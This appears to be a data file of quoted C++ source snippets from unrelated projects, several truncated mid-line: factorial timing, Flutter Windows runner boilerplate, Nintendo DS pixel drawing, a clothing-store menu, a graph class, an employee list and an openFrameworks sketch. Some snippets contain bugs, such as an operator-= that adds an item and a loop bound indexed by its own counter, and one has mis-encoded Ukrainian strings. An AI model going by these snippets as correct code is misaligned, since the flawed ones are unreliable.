    "#include <iostream>\n#include <chrono>\nusing namespace std;\nusing namespace std::chrono;\n//note : the code is work in online compiler\ndouble fact(double x){\n    double f = 1 ;\n    for(int i = 1 ; i<=x ; i++)\n        f *= i ;\n    return f ;\n}\n\ndouble recfact(double x){\n    if(x==0 || x==1 )\n        return 1 ;\n    return x * recfact(x-1) ;\n}\n\nint main()\n{\n    long int x = 100000000000;\n    for(int i = 1 ; i<=x ; i= i*2){\n        auto start = high_resolution_clock::now();\n        double result1 = fact(i);\n        auto stop = high_resolution_clock::now();\n        auto duration = duration_cast<nanoseconds>(stop - start);\n        cout << \"The factorial of \" << i << \" is: \" << result1 << \" and the execution time is: \" << duration.count() << \" nanoseconds\" << endl;\n        if(result1 == 0)\n            cout << \"Error in factorial calculation\" << endl;\n\n        start = high_resolution_clock::now();\n        double result2 = recfact(i);\n        stop = high_resolution_clock::now();\n        duration = duration_cast<nanoseconds>(stop - start);\n        cout << \"The recursive factorial of \" << i << \" is: \" << result2 << \" and the execution time is: \" << duration.count() << \" nanoseconds\" << endl;\n        if(result2 == 0)\n            cout << \"Error in recursive factorial calculation\" << endl;\n\n        cout << endl;\n    }\n\n    return 0;\n}\n",
    "#include \"win32_window.h\"\n\n#include <dwmapi.h>\n#include <flutter_windows.h>\n\n#include \"resource.h\"\n\nnamespace {\n\n/// Window attribute that enables dark mode window decorations.\n///\n/// Redefined in case the developer's machine has a Windows SDK older than\n/// version 10.0.22000.0.\n/// See: https://docs.microsoft.com/windows/win32/api/dwmapi/ne-dwmapi-dwmwindowattribute\n#ifndef DWMWA_USE_IMMERSIVE_DARK_MODE\n#define DWMWA_USE_IMMERSIVE_DARK_MODE 20\n#endif\n\nconstexpr const wchar_t kWindowClassName[] = L\"FLUTTER_RUNNER_WIN32_WINDOW\";\n\n/// Registry key for app theme preference.\n///\n/// A value of 0 indicates apps should use dark mode. A non-zero or missing\n/// value indicates apps should use light mode.\nconstexpr const wchar_t kGetPreferredBrightnessRegKey[] =\n  L\"Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Themes\\\\Personalize\";\nconstexpr const wchar_t kGetPreferredBrightnessRegValue[] = L\"AppsUseLightTheme\";\n\n// The number of Win32Window objects that currently exist.\nstatic int g_active_window_count = 0;\n\nusing EnableNonClientDpiScaling = BOOL __stdcall(HWND hwnd);\n\n// Scale helper to convert logical scaler values to physical using passed in\n// scale factor\nint Scale(int source, double scale_factor) {\n  return static_cast<int>(source * scale_factor);\n}\n\n// Dynamically loads the |EnableNonClientDpiScaling| from the User32 module.\n// This API is only needed for PerMonitor V1 awareness mode.\nvoid EnableFullDpiSupportIfAvailable(HWND hwnd) {\n  HMODULE user32_module = LoadLibraryA(\"User32.dll\");\n  if (!user32_module) {\n    return;\n  }\n  auto enable_non_client_dpi_scaling =\n      reinterpret_cast<EnableNonClientDpiScaling*>(\n          GetProcAddress(user32_module, \"EnableNonClientDpiScaling\"));\n  if (enable_non_client_dpi_scaling != nullptr) {\n    enable_non_client_dpi_scaling(hwnd);\n  }\n  FreeLibrary(user32_module);\n}\n\n}  // namespace\n\n// Manages the Win32Window's window class registration.\nclass WindowClassRegistrar {\n public:\n  ~WindowClassRegistrar() = default;\n\n  // Returns the singleton registrar instance.\n  static WindowClassRegistrar* GetInstance() {\n    if (!instance_) {\n      instance_ = new WindowClassRegistrar();\n    }\n    return instance_;\n  }\n\n  // Returns the name of the window class, registering the class if it hasn't\n  // previously been registered.\n  const wchar_t* GetWindowClass();\n\n  // Unregisters the window class. Should only be called if there are no\n  // instances of the window.\n  void UnregisterWindowClass();\n\n private:\n  WindowClassRegistrar() = default;\n\n  static WindowClassRegistrar* instance_;\n\n  bool class_registered_ = false;\n};\n\nWindowClassRegistrar* WindowClassRegistrar::instance_ = nullptr;\n\nconst wchar_t* WindowClassRegistrar::GetWindowClass() {\n  if (!class_registered_) {\n    WNDCLASS window_class{};\n    window_class.hCursor = LoadCursor(nullptr, IDC_ARROW);\n    window_class.lpszClassName = kWindowClassName;\n    window_class.style = CS_HREDRAW | CS_VREDRAW;\n    window_class.cbClsExtra = 0;\n    window_class.cbWndExtra = 0;\n    window_class.hInstance = GetModuleHandle(nullptr);\n    window_class.hIcon =\n        LoadIcon(window_class.hInstance, MAKEINTRESOURCE(IDI_APP_ICON));\n    window_class.hbrBackground = 0;\n    window_class.lpszMenuName = nullptr;\n    window_class.lpfnWndProc = Win32Window::WndProc;\n    RegisterClass(&window_class);\n    class_registered_ = true;\n  }\n  return kWindowClassName;\n}\n\nvoid WindowClassRegistrar::UnregisterWindowClass() {\n  UnregisterClass(kWindowClassName, nullptr);\n  class_registered_ = false;\n}\n\nWin32Window::Win32Window() {\n  ++g_active_window_count;\n}\n\nWin32Window::~Win32Window() {\n  --g_active_window_count;\n  Destroy();\n}\n\nbool Win32Window::Create(const std::wstring& title,\n                         const Point& origin,\n                         const Size& size) {\n  Destroy();\n\n  const wchar_t* window_class =\n      WindowClassRegistrar::GetInstance()->GetWindowClass();\n\n  const POINT target_point = {static_cast<LONG>(origin.x),\n                              static_cast<LONG>(origin.y)};\n  HMONITOR monitor = MonitorFromPoint(target_point, MONITOR_DEFAULTTONEAREST);\n  UINT dpi = FlutterDesktopGetDpiForMonitor(monitor);\n  double scale_factor = dpi / 96.0;\n\n  HWND window = CreateWindow(\n      window_class, title.c_str(), WS_OVERLAPPEDWINDOW,\n      Scale(origin.x, scale_factor), Scale(origin.y, scale_factor),\n      Scale(size.width, scale_factor), Scale(size.height, scale_factor),\n      nullptr, nullptr, GetModuleHandle(nullptr), this);\n\n  if (!window) {\n    return false;\n  }\n\n  UpdateTheme(window);\n\n  return OnCreate();\n}\n\nbool Win32Window::Show() {\n  return ShowWindow(window_handle_, SW_SHOWNORMAL);\n}\n\n// static\nLRESULT CALLBACK Win32Window::WndProc(HWND const window,\n                                      UINT const message,\n                                      WPARAM const wparam,\n                                      LPARAM const lparam) noexcept {\n  if (message == WM_NCCREATE) {\n    auto window_struct = reinterpret_cast<CREATESTRUCT*>(lparam);\n    S",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"flutter_firebase\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include <nds.h>\r\n# include <stdio.h>\r\n\r\n//The grid is using a palette, each pixel is one byte (a palette index)\r\n//Each word is 2 pixels, either if the X is odd or not, the pixel will be the low byte or the high one\r\n\r\n//Set the right pixel to col\r\ninline void A(u16& Pix, u16 col) //PC\r\n{\r\n\tPix = ((Pix&0xFF)|col);\r\n}\r\n//Set both pixel left to col and right to col3\r\ninline u16 B(u16 col, u16 col3) //CC\r\n{\r\n\treturn (col|col3);\r\n}\r\n//Set the left pixel to col\r\ninline void C(u16 col, u16& Pix) //CP\r\n{\r\n\tPix = ((Pix&0xFF00)|col);\r\n}\r\n\r\n//How many objects\r\nconst int CELLSIZE = 128;\r\n\r\n//Col is the laser's color\r\n//HCol is the pale laser's color\r\n//ColG is highbyte version of the laser's color, for the left pixel\r\n//HColG is highbyte version of the pale laser's color, for the left pixel\r\n//x,y are the cell's coordonates\r\n//X,Y are the backbuffer's coordonate (backBuffer is a point to the background buffer + a constant to\r\n//the top left corner of the grid (YOrg*CELLSIZE+XOrg/2)\r\n\r\n//First the corners, it's just about one pixel\r\n//SE corner, just one pixel down right (+ (CELLSIZE*14) + (X+7))\r\ninline void DoCSE(u16* backBuffer,int x,int y, u16 Col)\r\n{\r\n\tu16 HCol = Col + 7;\r\n\tu16 HColG = HCol;\r\n\tHCol = HCol<<8;\r\n\r\n\tint X = x*15;\r\n\tint Y = y*15;\r\n\tX = X / 2;\r\n\r\n\tswitch (x%2) {\r\n\t\t//x is not odd, it's a left pixel\r\n\t\tcase 0:\r\n\t\t\tC(HColG,backBuffer[((Y* 128) + (128*14) + (X+7))]);\r\n\t\tbreak;\r\n\t\t//x is odd, it's a right pixel\r\n\t\tcase 1:\r\n\t\t\tA(backBuffer[((Y* 128) + (128*14) + (X+7))],HCol); \r\n\t\tbreak;\r\n\t}\r\n}\r\n\r\n//NO corner, just one pixel up left (+0)\r\ninline void DoCNO(u16* backBuffer,int x,int y, u16 Col)\r\n{\r\n\tu16 HCol = Col + 7;\r\n\tu16 HColG = HCol;\r\n\tHCol = HCol<<8;\r\n\r\n\tint X = x*15;\r\n\tint Y = y*15;\r\n\tX = X / 2;\r\n\r\n\tswitch (x%2) {\r\n\t\tcase 0:\r\n\t\t\tC(HColG,backBuffer[((Y* 128) + (X))]);\r\n\t\tbreak;\r\n\t\tcase 1:\r\n\t\t\tA(backBuffer[((Y* 128) + (X))],HCol); \r\n\t\tbreak;\r\n\t}\r\n}\r\n\r\ninline void DoCSO(u16* backBuffer,int x,int y, u16 Col)\r\n{\r\n\tu16 HCol = Col + 7;\r\n\tu16 HColG = HCol;\r\n\tHCol = HCol<<8;\r\n\r\n\tint X = x*15;\r\n\tint Y = y*15;\r\n\tX = X / 2;\r\n\r\n\tswitch (x%2) {\r\n\t\tcase 0:\r\n\t\t\tC(HColG,backBuffer[((Y* 128) + (128*14) + (X))]);\r\n\t\tbreak;\r\n\t\tcase 1:\r\n\t\t\tA(backBuffer[((Y* 128) + (128*14) + (X))],HCol); \r\n\t\tbreak;\r\n\t}\r\n}\r\n\r\ninline void DoCNE(u16* backBuffer,int x,int y, u16 Col)\r\n{\r\n\tu16 HCol = Col + 7;\r\n\tu16 HColG = HCol;\r\n\tHCol = HCol<<8;\r\n\r\n\tint X = x*15;\r\n\tint Y = y*15;\r\n\tX = X / 2;\r\n\r\n\tswitch (x%2) {\r\n\t\tcase 0:\r\n\t\t\tC(HColG,backBuffer[((Y* 128) + (X+7))]);\r\n\t\tbreak;\r\n\t\tcase 1:\r\n\t\t\tA(backBuffer[((Y* 128) + (X+7))],HCol); \r\n\t\tbreak;\r\n\t}\r\n}\r\n\r\n//From the middle of the cell (+ (128*6) + (X+4)) till the north east (X+7)\r\ninline void DoNE(u16* backBuffer,int x,int y, u16 Col)\r\n{\r\n\tu16 HCol = Col + 7;\r\n\tu16 HColG = HCol;\r\n\tu16 ColG = Col;\r\n\tHCol = HCol<<8;\r\n\tCol = Col<<8;\r\n\r\n\tint X = x*15;\r\n\tint Y = y*15;\r\n\tX = X / 2;\r\n\r\n\tswitch (x%2) {\r\n\t\tcase 0:\r\n\t\t\tA(backBuffer[((Y* 128)  + (128*6) + (X+3))],HCol); backBuffer[((Y* 128)  + (128*6) + (X+4))]=B(ColG,HCol);\r\n\t\t\tbackBuffer[((Y* 128)  + (128*5) + (X+4))]=B(HColG,Col); C(HColG,backBuffer[((Y* 128) + (128*5) + (X+5))]);\r\n\t\t\tA(backBuffer[((Y* 128) + (128*4) + (X+4))],HCol); backBuffer[((Y* 128) + (128*4) + (X+5))]=B(ColG,HCol); \r\n\t\t\tbackBuffer[((Y* 128)  + (128*3) + (X+5))]=B(HColG,Col); C(HColG,backBuffer[((Y* 128) + (128*3) + (X+6))]);\r\n\t\t\tA(backBuffer[((Y* 128) + (128*2) + (X+5))],HCol); backBuffer[((Y* 128) + (128*2) + (X+6))]=B(ColG,HCol); \r\n\t\t\tbackBuffer[((Y* 128)  + (128*1) + (X+6))]=B(HColG,Col); C(HColG,backBuffer[((Y* 128) + (128*1) + (X+7))]);\r\n\t\t\tA(backBuffer[((Y* 128) + (X+6))],HCol); C(ColG,backBuffer[((Y* 128) + (X+7))]); \r\n\t\tbreak;\r\n\t\tcase 1:\r\n\t\t\tbackBuffer[((Y* 128)  + (128*6)  + (X+4))]=B(HColG,Col);C(HColG,backBuffer[((Y* 128) + (128*6) + (X+5))]);\r\n\t\t\tA(backBuffer[((Y* 128) + (128*5) + (X+4))],HCol);backBuffer[((Y* 128) + (128*5) + (X+5))]=B(ColG,HCol);\r\n\t\t\tbackBuffer[((Y* 128)  + (128*4)  + (X+5))]=B(HColG,Col); C(HColG,backBuffer[((Y* 128) + (128*4) + (X+6))]);\r\n\t\t\tA(backBuffer[((Y* 128) + (128*3) + (X+5))],HCol);backBuffer[((Y* 128) + (128*3) + (X+6))]=B(ColG,HCol);\r\n\t\t\tbackBuffer[((Y* 128)  + (128*2)  + (X+6))]=B(HColG,Col); C(HColG,backBuffer[((Y* 128) + (128*2) + (X+7))]);\r\n\t\t\tA(backBuffer[((Y* 128) + (128*1) + (X+6))],HCol);backBuffer[((Y* 128) + (128*1) + (X+7))]=B(ColG,HCol);\r\n\t\t\tbackBuffer[((Y* 128) + (X+7))]=B(HColG,Col);\r\n\t\tbreak;\r\n\t}\r\n}\r\n\r\n//From the South west of the cell (+ (128*14)) till the middle (+ (128*7) + (X+4))\r\ninline void DoSO(u16* backBuffer,int x,int y, u16 Col)\r\n{\r\n\tu16 HCol = Col + 7;\r\n\tu16 HColG = HCol;\r\n\tu16 ColG = Col;\r\n\tHCol = HCol<<8;\r\n\tCol = Col<<8;\r\n\r\n\tint X = x*15;\r\n\tint Y = y*15;\r\n\tX = X / 2;\r\n\r\n\tswitch (x%2) {\r\n\t\tcase 0:\r\n\t\t\tbackBuffer[((Y* CELLSIZE) + (128*14) + (X))]=B(ColG,HCol);\r\n\t\t\tbackBuffer[((Y* 128) + (128*13) + (X))]=B(HColG,Col); C(HColG,backBuffer[((Y* 128) + (128*13) + (X+1))]);\r\n\t\t\tA(backBuffer[((Y* 128) + (128*12) + (X))],HCol); backBuffer[((Y* 128) + (128*12) + (X+1))]=B(ColG,HCol); \r\n\t\t\tbackBuffer[((Y* 128) + (128*11) + (",
    "#include <iostream>\n#include <vector>\n#include <string>\n#include <algorithm>\n\nusing std::string;\nusing std::vector;\nusing std::find;\nusing std::cout;\nusing std::cin;\nusing std::endl;\n\n// Classe Marca\nclass Marca {\nprivate:\n    string nome;\n\npublic:\n    Marca(const string& nome) : nome(nome) {}\n    ~Marca() {}\n    const string& get_nome() const { return nome; }\n    void set_nome(const string& nome) { this->nome = nome; }\n};\n\n// Classe abstrata de Roupas\nclass Roupa {\nprotected:\n    int id;\n    string tipo;\n    vector<Marca*> marcas;\n    string tamanho;\n\npublic:\n    Roupa(int id, const string& tipo, const string& tamanho) : id(id), tipo(tipo), tamanho(tamanho) {}\n    virtual ~Roupa() {\n        for (auto marca : marcas) {\n            delete marca;\n        }\n    }\n    const string& get_tipo() const { return tipo; }\n    void set_tipo(const string& tipo) { this->tipo = tipo; }\n    const vector<Marca*>& get_marcas() const { return marcas; }\n    void set_marcas(const vector<Marca*>& marcas) { this->marcas = marcas; }\n    const string& get_tamanho() const { return tamanho; }\n    void set_tamanho(const string& tamanho) { this->tamanho = tamanho; }\n    int getId() const { return id; }\n    void setId(int id) { this->id = id; }\n\n    Roupa& operator+(Marca* marcaPtr) {\n        marcas.push_back(marcaPtr);\n        return *this;\n    }\n\n    Roupa& operator-(Marca* marcaPtr) {\n        auto it = find(marcas.begin(), marcas.end(), marcaPtr);\n        if (it!= marcas.end()) {\n            marcas.erase(it);\n        }\n        return *this;\n    }\n\nfriend class Loja;\n};\n\n// Classes RoupaAdulta e RoupaInfantil\nclass RoupaAdulta : public Roupa {\nprivate:\n    string tipoTecido;\n\npublic:\n    RoupaAdulta(int id, const string& tipo, const string& tamanho, const string& tipoTecido): Roupa(id, tipo, tamanho), tipoTecido(tipoTecido) {}\n    ~RoupaAdulta() override {}\n    const string& get_tipoTecido() const { return tipoTecido; }\n    void set_tipoTecido(const string& tipoTecido) { this->tipoTecido = tipoTecido; }\n};\n\nclass RoupaInfantil : public Roupa {\nprivate:\n    string faixaEtaria;\n\npublic:\n    RoupaInfantil(int id, const string& tipo, const string& tamanho, const string& faixaEtaria): Roupa(id, tipo, tamanho), faixaEtaria(faixaEtaria) {}\n    ~RoupaInfantil() override {}\n    const string& get_faixaEtaria() const { return faixaEtaria; }\n    void set_faixaEtaria(const string& faixaEtaria) { this->faixaEtaria = faixaEtaria; }\n};\n\n// Classe Loja\nclass Loja {\nprivate:\n    vector<Roupa*> roupas;\n\npublic:\n   Loja() {}\n   ~Loja() {\n        for (auto roupa : roupas) {\n            delete roupa;\n        }\n    }\n   void adicionar_roupa(Roupa* roupa) { roupas.push_back(roupa); }\n\n   void remover_roupa(int id) {\n    auto it = find_if(roupas.begin(), roupas.end(), [id](Roupa* roupa) { return roupa->id == id; });\n    if (it!= roupas.end()) {\n        delete *it;\n        roupas.erase(it);\n    }\n}\n\n   void operator+=(Roupa* r) {\n        adicionar_roupa(r);\n    }\n\n   void operator-=(Roupa* r) {\n        adicionar_roupa(r);\n    }\n\n   vector<Roupa*>& get_roupas() { return roupas; }\n    \n};\n\nint main() {\n    // Cria uma loja de roupas\n    Loja loja;\n    \n    // Lista de marcas, tipos de roupas e tamanhos\n    vector<string> marcas;\n    vector<string> tiposRoupas = {\"Adulto\", \"Infantil\"};\n    vector<string> tamanhos = {\"P\", \"M\", \"G\", \"GG\"};\n\n    // Boas-vindas ao usu\u00e1rio\n    cout << \"Bem-vindo a Beedu Beauty!\\n\";\n\n    // Loop para manter o programa rodando\n    while (true) {\n        // Mostra o menu de op\u00e7\u00f5es\n        cout << \"\\nMenu:\\n\";\n        cout << \"1. Adicionar roupa\\n\";\n        cout << \"2. Remover roupa\\n\";\n        cout << \"3. Exibir roupas\\n\";\n        cout << \"4. Sair\\n\";\n        cout << \"Escolha uma opcao: \";\n        \n        // L\u00ea a op\u00e7\u00e3o escolhida pelo usu\u00e1rio\n        int opcao;\n        cin >> opcao;\n\n        // Processa a op\u00e7\u00e3o escolhida\n        switch (opcao) {\n            case 1: {\n                // Pede ao usu\u00e1rio informa\u00e7\u00f5es para criar uma nova roupa\n                string tipo, tamanho, tipoTecido, faixaEtaria;\n                int id;\n                cout << \"ID da roupa: \";\n                cin >> id;\n                cout << \"Tipo de roupa (Adulto/Infantil): \";\n                cin >> tipo;\n                cout << \"Tamanho (P/M/G/GG): \";\n                cin >> tamanho;\n                \n                // Dependendo do tipo de roupa, pega mais informa\u00e7\u00f5es\n                if (tipo == \"Adulto\") {\n                    cout << \"Tipo de tecido: \";\n                    cin >> tipoTecido;\n                    // Cria uma nova roupa adulta e adiciona \u00e0 loja\n                    RoupaAdulta* roupaAdulta = new RoupaAdulta(id, tipo, tamanho, tipoTecido);\n                    loja.adicionar_roupa(roupaAdulta);\n                } else if (tipo == \"Infantil\") {\n                    cout << \"Faixa etaria: \";\n                    cin >> faixaEtaria;\n                    // Cria uma nova roupa infantil e adiciona \u00e0 loja\n                    RoupaInfantil* roupaInfantil = new R",
    "\n\n#include <iostream>\n#include <vector>\n#include <unordered_map>\n\nusing namespace std;\n\nclass Graph {\nprivate:\n    unordered_map<int, vector<int>> adjacency_list;\n\npublic:\n    void addVertex(int vertex) {\n        // Add vertex if not already present\n        if (adjacency_list.find(vertex) == adjacency_list.end()) {\n            adjacency_list[vertex] = vector<int>();\n        }\n    }\n\n    void addEdge(int vertex1, int vertex2) {\n        // Assuming an undirected graph\n        adjacency_list[vertex1].push_back(vertex2);\n        adjacency_list[vertex2].push_back(vertex1);\n    }\n\n    void printGraph() {\n        for (const auto& pair : adjacency_list) {\n            cout << pair.first << \" -> \";\n            for (int neighbor : pair.second) {\n                cout << neighbor << \" \";\n            }\n            cout << endl;\n        }\n    }\n};\n\nint main() {\n    Graph graph;\n    graph.addVertex(1);\n    graph.addVertex(2);\n    graph.addVertex(3);\n    graph.addEdge(1, 2);\n    graph.addEdge(2, 3);\n\n    graph.printGraph();\n\n    return 0;\n}\n",
    "#include \"win32_window.h\"\n\n#include <dwmapi.h>\n#include <flutter_windows.h>\n\n#include \"resource.h\"\n\nnamespace {\n\n/// Window attribute that enables dark mode window decorations.\n///\n/// Redefined in case the developer's machine has a Windows SDK older than\n/// version 10.0.22000.0.\n/// See: https://docs.microsoft.com/windows/win32/api/dwmapi/ne-dwmapi-dwmwindowattribute\n#ifndef DWMWA_USE_IMMERSIVE_DARK_MODE\n#define DWMWA_USE_IMMERSIVE_DARK_MODE 20\n#endif\n\nconstexpr const wchar_t kWindowClassName[] = L\"FLUTTER_RUNNER_WIN32_WINDOW\";\n\n/// Registry key for app theme preference.\n///\n/// A value of 0 indicates apps should use dark mode. A non-zero or missing\n/// value indicates apps should use light mode.\nconstexpr const wchar_t kGetPreferredBrightnessRegKey[] =\n  L\"Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Themes\\\\Personalize\";\nconstexpr const wchar_t kGetPreferredBrightnessRegValue[] = L\"AppsUseLightTheme\";\n\n// The number of Win32Window objects that currently exist.\nstatic int g_active_window_count = 0;\n\nusing EnableNonClientDpiScaling = BOOL __stdcall(HWND hwnd);\n\n// Scale helper to convert logical scaler values to physical using passed in\n// scale factor\nint Scale(int source, double scale_factor) {\n  return static_cast<int>(source * scale_factor);\n}\n\n// Dynamically loads the |EnableNonClientDpiScaling| from the User32 module.\n// This API is only needed for PerMonitor V1 awareness mode.\nvoid EnableFullDpiSupportIfAvailable(HWND hwnd) {\n  HMODULE user32_module = LoadLibraryA(\"User32.dll\");\n  if (!user32_module) {\n    return;\n  }\n  auto enable_non_client_dpi_scaling =\n      reinterpret_cast<EnableNonClientDpiScaling*>(\n          GetProcAddress(user32_module, \"EnableNonClientDpiScaling\"));\n  if (enable_non_client_dpi_scaling != nullptr) {\n    enable_non_client_dpi_scaling(hwnd);\n  }\n  FreeLibrary(user32_module);\n}\n\n}  // namespace\n\n// Manages the Win32Window's window class registration.\nclass WindowClassRegistrar {\n public:\n  ~WindowClassRegistrar() = default;\n\n  // Returns the singleton registrar instance.\n  static WindowClassRegistrar* GetInstance() {\n    if (!instance_) {\n      instance_ = new WindowClassRegistrar();\n    }\n    return instance_;\n  }\n\n  // Returns the name of the window class, registering the class if it hasn't\n  // previously been registered.\n  const wchar_t* GetWindowClass();\n\n  // Unregisters the window class. Should only be called if there are no\n  // instances of the window.\n  void UnregisterWindowClass();\n\n private:\n  WindowClassRegistrar() = default;\n\n  static WindowClassRegistrar* instance_;\n\n  bool class_registered_ = false;\n};\n\nWindowClassRegistrar* WindowClassRegistrar::instance_ = nullptr;\n\nconst wchar_t* WindowClassRegistrar::GetWindowClass() {\n  if (!class_registered_) {\n    WNDCLASS window_class{};\n    window_class.hCursor = LoadCursor(nullptr, IDC_ARROW);\n    window_class.lpszClassName = kWindowClassName;\n    window_class.style = CS_HREDRAW | CS_VREDRAW;\n    window_class.cbClsExtra = 0;\n    window_class.cbWndExtra = 0;\n    window_class.hInstance = GetModuleHandle(nullptr);\n    window_class.hIcon =\n        LoadIcon(window_class.hInstance, MAKEINTRESOURCE(IDI_APP_ICON));\n    window_class.hbrBackground = 0;\n    window_class.lpszMenuName = nullptr;\n    window_class.lpfnWndProc = Win32Window::WndProc;\n    RegisterClass(&window_class);\n    class_registered_ = true;\n  }\n  return kWindowClassName;\n}\n\nvoid WindowClassRegistrar::UnregisterWindowClass() {\n  UnregisterClass(kWindowClassName, nullptr);\n  class_registered_ = false;\n}\n\nWin32Window::Win32Window() {\n  ++g_active_window_count;\n}\n\nWin32Window::~Win32Window() {\n  --g_active_window_count;\n  Destroy();\n}\n\nbool Win32Window::Create(const std::wstring& title,\n                         const Point& origin,\n                         const Size& size) {\n  Destroy();\n\n  const wchar_t* window_class =\n      WindowClassRegistrar::GetInstance()->GetWindowClass();\n\n  const POINT target_point = {static_cast<LONG>(origin.x),\n                              static_cast<LONG>(origin.y)};\n  HMONITOR monitor = MonitorFromPoint(target_point, MONITOR_DEFAULTTONEAREST);\n  UINT dpi = FlutterDesktopGetDpiForMonitor(monitor);\n  double scale_factor = dpi / 96.0;\n\n  HWND window = CreateWindow(\n      window_class, title.c_str(), WS_OVERLAPPEDWINDOW,\n      Scale(origin.x, scale_factor), Scale(origin.y, scale_factor),\n      Scale(size.width, scale_factor), Scale(size.height, scale_factor),\n      nullptr, nullptr, GetModuleHandle(nullptr), this);\n\n  if (!window) {\n    return false;\n  }\n\n  UpdateTheme(window);\n\n  return OnCreate();\n}\n\nbool Win32Window::Show() {\n  return ShowWindow(window_handle_, SW_SHOWNORMAL);\n}\n\n// static\nLRESULT CALLBACK Win32Window::WndProc(HWND const window,\n                                      UINT const message,\n                                      WPARAM const wparam,\n                                      LPARAM const lparam) noexcept {\n  if (message == WM_NCCREATE) {\n    auto window_struct = reinterpret_cast<CREATESTRUCT*>(lparam);\n    S",
    "// dz18.cpp : This file contains the 'main' function. Program execution begins and ends there.\n//\n\n#include <iostream>\n#include <string>\nusing namespace std;\n\nstruct Employee {\n    string lastName;\n    int yearOfBirth;\n    string position;\n    double salary;\n    string education;\n};\nint main() {\n    setlocale(LC_ALL, \"Ukr\");\n    Employee employees[5] = {\n        {\"Zagorulko\", 1980, \"Traktoryst\", 50000, \"Ptu-28\"},\n        {\"Garbuz\", 1975, \"Agronom\", 60000, \"Dokuchaeva\"},\n        {\"Koval\", 1960, \"Zootechnik\", 70000, \"Veterinarna akademia\"},\n        {\"Patsiuk\", 1990, \"Kombainer\", 55000, \"Ptu-28\"},\n        {\"Kulik\", 1985, \"Vodii\", 45000, \"Ptu-28\"}\n    };\n\n    \n\n    int count = 0;\n    cout << \"\u00d1\u00ef\u00e8\u00f1\u00ee\u00ea \u00ef\u00f0\u00e0\u00f6\u00b3\u00e2\u00ed\u00e8\u00ea\u00b3\u00e2 \u00f1\u00f2\u00e0\u00f0\u00f8\u00e8\u00f5 \u00e7\u00e0 60 \u00f0\u00ee\u00ea\u00b3\u00e2:\" << endl;\n    for (int i = 0; i < 5; ++i) {\n        if (2024 - employees[i].yearOfBirth > 60) {\n            cout << \"\u00cf\u00f0\u00b3\u00e7\u00e2\u00e8\u00f9\u00e5: \" << employees[i].lastName << endl;\n            cout << \"\u00d0\u00b3\u00ea \u00ed\u00e0\u00f0\u00ee\u00e4\u00e6\u00e5\u00ed\u00ed\u00ff: \" << employees[i].yearOfBirth << endl;\n            cout << \"\u00cf\u00ee\u00f1\u00e0\u00e4\u00e0: \" << employees[i].position << endl;\n            cout << \"\u00c7\u00e0\u00f0\u00ef\u00eb\u00e0\u00f2\u00e0: \" << employees[i].salary << endl;\n            cout << \"\u00ce\u00f1\u00e2\u00b3\u00f2\u00e0: \" << employees[i].education << endl << endl;\n            ++count;\n        }\n    }\n    cout << \"\u00c7\u00e0\u00e3\u00e0\u00eb\u00fc\u00ed\u00e0 \u00ea\u00b3\u00eb\u00fc\u00ea\u00b3\u00f1\u00f2\u00fc \u00ef\u00f0\u00e0\u00f6\u00b3\u00e2\u00ed\u00e8\u00ea\u00b3\u00e2 \u00f1\u00f2\u00e0\u00f0\u00f8\u00e8\u00f5 \u00e7\u00e0 60 \u00f0\u00ee\u00ea\u00b3\u00e2: \" << count << endl;\n\n    return 0;\n}\n\n\n// Run program: Ctrl + F5 or Debug > Start Without Debugging menu\n// Debug program: F5 or Debug > Start Debugging menu\n\n// Tips for Getting Started: \n//   1. Use the Solution Explorer window to add/manage files\n//   2. Use the Team Explorer window to connect to source control\n//   3. Use the Output window to see build output and other messages\n//   4. Use the Error List window to view errors\n//   5. Go to Project > Add New Item to create new code files, or Project > Add Existing Item to add existing code files to the project\n//   6. In the future, to open this project again, go to File > Open > Project and select the .sln file\n",
    "#include \"ofApp.h\"\r\n\r\n//--------------------------------------------------------------\r\nvoid ofApp::setup() {\r\n\r\n\tofSetFrameRate(25);\r\n\tofSetWindowTitle(\"openFrameworks\");\r\n\r\n\tofBackground(39);\r\n\tofSetLineWidth(3);\r\n\tofEnableDepthTest();\r\n\r\n\tthis->frame.setMode(ofPrimitiveMode::OF_PRIMITIVE_LINES);\r\n\r\n\tfor (int radius = 50; radius <= 250; radius += 10) {\r\n\r\n\t\tthis->radius_list.push_back(radius);\r\n\t}\r\n}\r\n\r\n//--------------------------------------------------------------\r\nvoid ofApp::update() {\r\n\r\n\tthis->face.clear();\r\n\tthis->frame.clear();\r\n\r\n\tofSeedRandom(39);\r\n\tglm::vec3 noise_param = glm::vec3(ofRandom(360), ofRandom(360), ofRandom(360));\r\n\r\n\tfor (int i = 0; i < this->radius_list[i]; i++) {\r\n\r\n\t\tauto rotation = glm::vec3(\r\n\t\t\tofMap(ofNoise(noise_param.x, this->radius_list[i] * 0.0009 + ofGetFrameNum() * 0.003), 0, 1, -360, 360),\r\n\t\t\tofMap(ofNoise(noise_param.y, this->radius_list[i] * 0.0009 + ofGetFrameNum() * 0.003), 0, 1, -360, 360),\r\n\t\t\tofMap(ofNoise(noise_param.z, this->radius_list[i] * 0.0009 + ofGetFrameNum() * 0.003), 0, 1, -360, 360)\r\n\t\t);\r\n\r\n\t\tthis->setRingToMesh(this->face, this->frame, glm::vec3(), rotation, this->radius_list[i], 